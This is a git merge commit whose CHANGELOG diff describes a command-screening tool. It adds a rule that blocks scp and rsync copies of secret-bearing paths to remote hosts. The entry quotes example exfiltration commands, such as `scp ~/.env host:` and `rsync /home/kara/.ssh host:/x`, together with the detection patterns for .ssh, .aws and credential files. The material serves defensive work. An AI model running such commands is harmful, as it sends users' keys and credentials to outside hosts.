@@ -1,0 +1,79 @@
+commit ec3e645b14d23e5060c245b4c62a01e32d1cfd31
+Merge: fb29d58 6f6c2e6
+Author:     totalwindupflightsystems <totalwindupflightsystems@gmail.com>
+AuthorDate: Sun Sep 20 05:17:12 2026 -0500
+Commit:     totalwindupflightsystems <totalwindupflightsystems@gmail.com>
+CommitDate: Sun Sep 20 05:17:12 2026 -0500
+
+    merge: VERSION-002 — in-process bridge tests, real-exec parity seam kept (worker salvage 6f6c2e6)
+    
+    # Conflicts:
+    #       CHANGELOG.md
+    
+    Co-authored-by: Alexis Okuwa <wojonstech@gmail.com>
+
+ CHANGELOG.md                           |  13 +-
+ plugin/test_interruptor_integration.py | 226 +++++++++++++++++++++++----------
+ 2 files changed, 172 insertions(+), 67 deletions(-)
+
+diff --cc CHANGELOG.md
+index cd4a745,cdce0c8..19f5c69
+--- a/CHANGELOG.md
++++ b/CHANGELOG.md
+@@@ -1,42 -1,20 +1,53 @@@
+ -# Changelog
+ -
+  ## [Unreleased]
+  
++ ### Bridge-level integration tests run in-process; one real-exec parity test keeps the wire contract (VERSION-002)
++ 
++ - **`plugin/test_interruptor_integration.py`** (load-hygiene, no coverage loss):
++   the bridge assertions drove `python3 interruptor_bridge.py` per assertion —
++   one interpreter spawn + full rule-layer rebuild each, ~105 ms apiece, while
++   the verdict/JSON envelope was the only thing under test. They now call
++   `interruptor_bridge.main()` in-process at the patched stream boundary; the
++   process boundary stays pinned by `test_bridge_real_exec_parity` (real spawn,
++   byte-identical stdout/rc across allow/block/modify/fail-open inputs) and a
++   structural no-spawn guard test. File wall time 7.8s → 4.1s; suite total
++   -3.7s. CLI-level tests are unchanged — there the process IS the subject.
++ 
+ +### Scoped secret-source scp/rsync to remote hosts now blocks (DF-TERMINAL-JAIL-29)
+ +
+ +- **Rule** (`builtin-net-remote-tree-copy`, engine + byte-identical YAML mirror):
+ +  the whole-tree arm previously left every scoped secret-bearing source
+ +  (`scp ~/.env host:`, `scp id_rsa host:`, `rsync /home/kara/.ssh host:/x`,
+ +  `scp -r ~ host:/x`) on default-allow — the exfil matrix had a hole exactly at
+ +  the ssh-family copy tools. A second pattern arm now blocks an rsync/scp whose
+ +  SOURCE carries a `~`, a `.ssh`/`.gnupg`/`.aws`/`.config`/`.env` component, or
+ +  an `id_rsa`/`id_ed25519`/`known_hosts`/`credentials` name when the
+ +  DESTINATION is remote (`host:path`, bracketed IPv6 `[...]:`, `host::module`);
+ +  the `~/` whole-home spelling moved from the root arm into this arm
+ +  (`~/(?![\w.])`), and the root arm's source lookbehind tightened
+ +  `(?<![\w/])` → `(?<![\w/~])` so a `/` after `~` can no longer impersonate the
+ +  root token (that lookbehind tolerated the `/` inside `~/.ssh`-style paths,
+ +  over-blocking two shapes the no-false-positive gate pins: the
+ +  `-o IdentityFile=~/.ssh/id_rsa` option value and `scp ~/.sshx host:/x`).
+ +  Plain scoped copies (`scp -r ~/proj host:/srv/`, `rsync -av ~/proj/ host:…`,
+ +  non-secret names, secret-to-LOCAL copies, `=`-joined option values) keep
+ +  their ALLOW verdict. 23 new block vectors + 17 new allow controls in
+ +  `plugin/test_interruptor.py` (all fail against the pre-fix engine).
+ +- **Docs**: README rule list + verdict table, `specs/interruptor.md` rule table
+ +  + verdict table, `docs/rule-catalog.md` row reworded to the new shape.
+ +
+ +### Validator-refusal tests tolerate documented sandbox banners (DF-TERMINAL-JAIL-28)
+ +
+ +- **`plugin/test_rule_packs.py`** (test-contract fix, no engine change):
+ +  `TestValidatorRefusals` asserted exactly one stderr line, which broke all 11
+ +  refusal tests on subuid hosts where the DF-TERMINAL-JAIL-15 degradation
+ +  warning (`WARNING: no filesystem isolation`) precedes the refusal. The
+ +  helper now asserts refusal PRESENCE (the `rule-pack-tool: refused:` line,
+ +  exactly once, carrying the expected reason) and permits only the
+ +  `DOCUMENTED_SANDBOX_BANNERS`, each at most once; any other stderr line
+ +  still fails. New `TestAssertRefusedContract` self-tests prove both shapes,
+ +  enabling green runs on degraded-FS hosts with no env overrides.
+ +
+  ### Prefix-scope rule packs skip instead of installing inert (DF-TERMINAL-JAIL-22)
+- ### Prefix-scope rule packs skip instead of installing inert (DF-TERMINAL-JAIL-22)
+  
+  - **`install.sh`**: with a custom `TERMINAL_JAIL_INSTALL_DIR` prefix and no
+    rules-dir override, the resolved rules dir (`<prefix>/config/terminal-jail/rules.d`)
